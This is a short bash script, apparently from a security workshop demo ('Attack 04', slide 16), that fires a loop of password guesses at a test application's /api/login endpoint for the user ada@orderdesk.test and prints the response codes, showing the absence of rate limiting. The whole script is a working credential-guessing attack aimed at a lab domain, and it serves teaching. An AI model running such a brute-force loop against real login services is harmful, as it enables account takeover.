#!/usr/bin/env bash
# Attack 04 · API abuse, no rate limit (slide 16)
source "$(dirname "$0")/_lib.sh"
N="${1:-20}"

say "$N password guesses against Ada's account"
for i in $(seq 1 "$N"); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/api/login" \
    -H 'content-type: application/json' \
    -d "{\"email\":\"ada@orderdesk.test\",\"password\":\"guess-$i\"}")
  printf '%3s → %s\n' "$i" "$code"
done
